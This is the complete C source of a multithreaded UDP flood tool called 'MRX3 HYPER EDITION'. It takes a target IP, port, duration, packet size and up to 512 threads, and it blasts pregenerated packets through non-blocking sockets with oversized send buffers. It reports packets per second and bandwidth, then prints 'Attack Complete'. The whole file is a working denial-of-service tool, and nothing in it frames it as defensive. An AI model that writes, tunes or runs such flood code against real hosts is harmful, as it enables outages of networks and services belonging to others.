#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <sched.h>
#include <errno.h>
#include <sys/time.h>

char *TARGET_IP;
int TARGET_PORT;
int DURATION_TIME;
int PACKET_SIZE;
int THREAD_COUNT;

_Atomic unsigned long long total_packets = 0;
_Atomic unsigned long long total_bytes = 0;
_Atomic unsigned long long peak_pps = 0;
pthread_t monitor_thread;
int monitor_running = 1;

#define MAX_THREADS 512
#define PREGEN_COUNT 64
#define SOCKET_BUFFER_SIZE (200 * 1024 * 1024)
#define BURST_MULTIPLIER 8

typedef struct {
    uint32_t timestamp;
    uint16_t packet_id;
    uint8_t packet_type;
    uint8_t flags;
    uint32_t sequence;
    uint16_t checksum;
} udp_header_t;

static char *pregen_buffers[PREGEN_COUNT];

void set_cpu_affinity(int thread_id) {
#ifdef __linux__
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if (cpu_count > 0) {
        CPU_SET(thread_id % cpu_count, &cpuset);
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    }
#endif
}

uint32_t fast_rand(uint64_t *state) {
    *state = (*state * 1103515245 + 12345) & 0x7FFFFFFF;
    return (uint32_t)*state;
}

void init_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        pregen_buffers[i] = malloc(PACKET_SIZE);
        if (pregen_buffers[i]) {
            udp_header_t *hdr = (udp_header_t *)pregen_buffers[i];
            hdr->packet_type = 0xA1;
            hdr->flags = 0xC3;
            
            uint32_t pattern = i * 0x9E3779B9;
            for (int j = sizeof(udp_header_t); j < PACKET_SIZE; j++) {
                pregen_buffers[i][j] = (char)((pattern + j) & 0xFF);
                pattern = (pattern << 1) | (pattern >> 31);
            }
        }
    }
}

void cleanup_pregen_buffers() {
    for (int i = 0; i < PREGEN_COUNT; i++) {
        if (pregen_buffers[i]) {
            free(pregen_buffers[i]);
        }
    }
}

int create_optimized_socket() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) return -1;
    
    int enable = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &enable, sizeof(enable));
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(enable));
    
    int sndbuf = SOCKET_BUFFER_SIZE;
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    return sockfd;
}

void *attack_thread(void *arg) {
    int thread_id = *(int *)arg;
    set_cpu_affinity(thread_id);
    
    int sockfd = create_optimized_socket();
    if (sockfd < 0) return NULL;
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP);
    
    time_t start_time = time(NULL);
    int packet_index = thread_id % PREGEN_COUNT;
    uint64_t rand_state = time(NULL) + thread_id;
    
    uint64_t local_packets = 0;
    uint64_t local_bytes = 0;
    
    while (time(NULL) - start_time < DURATION_TIME) {
        int burst_size = BURST_MULTIPLIER * (1 + (thread_id % 4));
        
        for (int i = 0; i < burst_size; i++) {
            if (!pregen_buffers[packet_index]) {
                char temp_packet[PACKET_SIZE];
                for (int j = 0; j < PACKET_SIZE; j++) {
                    temp_packet[j] = (char)(fast_rand(&rand_state) & 0xFF);
                }
                sendto(sockfd, temp_packet, PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&target_addr, sizeof(target_addr));
            } else {
                udp_header_t *hdr = (udp_header_t *)pregen_buffers[packet_index];
                hdr->timestamp = (uint32_t)time(NULL);
                hdr->packet_id = thread_id;
                hdr->sequence = local_packets;
                hdr->checksum = (hdr->timestamp ^ hdr->sequence) & 0xFFFF;
                
                sendto(sockfd, pregen_buffers[packet_index], PACKET_SIZE, MSG_DONTWAIT,
                      (struct sockaddr *)&target_addr, sizeof(target_addr));
            }
            
            local_packets++;
            packet_index = (packet_index + 1) % PREGEN_COUNT;
            
            if (i % 16 == 0) {
                sched_yield();
            }
        }
        
        local_bytes += burst_size * PACKET_SIZE;
        
        if (local_packets % 5000 == 0) {
            atomic_fetch_add(&total_packets, 5000);
            atomic_fetch_add(&total_bytes, 5000 * PACKET_SIZE);
            local_packets = 0;
            local_bytes = 0;
        }
        
        if (burst_size > 10) {
            struct timespec ts = {0, 500};
            nanosleep(&ts, NULL);
        }
    }
    
    atomic_fetch_add(&total_packets, local_packets);
    atomic_fetch_add(&total_bytes, local_bytes);
    
    close(sockfd);
    return NULL;
}

void *stats_monitor(void *arg) {
    unsigned long long prev_packets = 0;
    unsigned long long prev_bytes = 0;
    time_t last_print = time(NULL);
    
    while (monitor_running) {
        sleep(1);
        
        unsigned long long current_packets = atomic_load(&total_packets);
        unsigned long long current_bytes = atomic_load(&total_bytes);
        
        unsigned long long pps = current_packets - prev_packets;
        unsigned long long bps = current_bytes - prev_bytes;
        
        prev_packets = current_packets;
        prev_bytes = current_bytes;
        
        if (pps > atomic_load(&peak_pps)) {
            atomic_store(&peak_pps, pps);
        }
        
        unsigned long long pps_k = pps / 1000;
        unsigned long long peak_k = atomic_load(&peak_pps) / 1000;
        unsigned long long mbps = (bps * 8) / (1024 * 1024);
        
        fprintf(stderr, "PPS:%lluK/s | Peak:%lluK/s | BW:%lluMbps\n",
               pps_k, peak_k, mbps);
        fflush(stderr);
        last_print = time(NULL);
    }
    return NULL;
}

void usage() {
    fprintf(stderr, "Usage: ./mrx3 [IP] [PORT] [TIME] [SIZE] [THREADS]\n");
    fprintf(stderr, "Example: ./mrx3 192.168.1.1 7777 60 128 300\n");
    exit(EXIT_FAILURE);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        usage();
    }
    
    TARGET_IP = argv[1];
    TARGET_PORT = atoi(argv[2]);
    DURATION_TIME = atoi(argv[3]);
    PACKET_SIZE = atoi(argv[4]);
    THREAD_COUNT = atoi(argv[5]);
    
    if (TARGET_PORT <= 0 || DURATION_TIME <= 0 || 
        PACKET_SIZE <= 0 || THREAD_COUNT <= 0) {
        fprintf(stderr, "Invalid parameters\n");
        usage();
    }
    
    if (THREAD_COUNT > MAX_THREADS) {
        THREAD_COUNT = MAX_THREADS;
        fprintf(stderr, "Threads limited to %d\n", MAX_THREADS);
    }
    
    if (PACKET_SIZE > 65507) PACKET_SIZE = 65507;
    if (PACKET_SIZE < 64) PACKET_SIZE = 64;
    
    fprintf(stderr, "MRX3 HYPER EDITION\n");
    fprintf(stderr, "Target: %s:%d | Time: %ds | Size: %d | Threads: %d\n\n",
            TARGET_IP, TARGET_PORT, DURATION_TIME, PACKET_SIZE, THREAD_COUNT);
    
    init_pregen_buffers();
    
    pthread_t threads[MAX_THREADS];
    int thread_ids[MAX_THREADS];
    
    pthread_create(&monitor_thread, NULL, stats_monitor, NULL);
    
    int created_threads = 0;
    for (int i = 0; i < THREAD_COUNT; i++) {
        thread_ids[i] = i;
        if (pthread_create(&threads[i], NULL, attack_thread, &thread_ids[i]) == 0) {
            created_threads++;
        }
        
        if (i % 50 == 0 && i > 0) {
            usleep(2000);
        }
    }
    
    fprintf(stderr, "Started %d threads\n\n", created_threads);
    
    sleep(DURATION_TIME);
    monitor_running = 0;
    
    for (int i = 0; i < created_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(monitor_thread, NULL);
    
    unsigned long long final_packets = atomic_load(&total_packets);
    unsigned long long final_bytes = atomic_load(&total_bytes);
    unsigned long long final_peak = atomic_load(&peak_pps);
    
    unsigned long long avg_pps = final_packets / DURATION_TIME;
    unsigned long long avg_mbps = (final_bytes * 8) / (DURATION_TIME * 1024 * 1024);
    
    fprintf(stderr, "\nAttack Complete\n");
    fprintf(stderr, "Packets: %llu (%.1fM)\n", 
            final_packets, final_packets / 1000000.0);
    fprintf(stderr, "Data: %.2f MB\n", 
            final_bytes / (1024.0 * 1024.0));
    fprintf(stderr, "Avg PPS: %lluK/s\n", avg_pps / 1000);
    fprintf(stderr, "Peak PPS: %lluK/s\n", final_peak / 1000);
    fprintf(stderr, "Avg BW: %llu Mbps\n", avg_mbps);
    
    cleanup_pregen_buffers();
    
    return 0;
}